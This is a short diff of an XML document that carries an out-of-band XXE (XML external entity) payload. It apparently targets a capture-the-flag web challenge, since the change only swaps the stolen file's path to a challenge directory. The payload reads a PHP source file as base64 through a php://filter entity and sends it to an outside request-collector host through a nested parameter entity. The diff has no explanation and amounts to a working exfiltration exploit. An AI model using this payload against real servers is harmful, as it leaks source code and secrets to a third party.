@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=/index.php">
+<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=/web-serveur/ch29/index.php">
 <!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://requestb.in/1c7ii141?%payl;'>">]>
 <rss version="2.0">
 
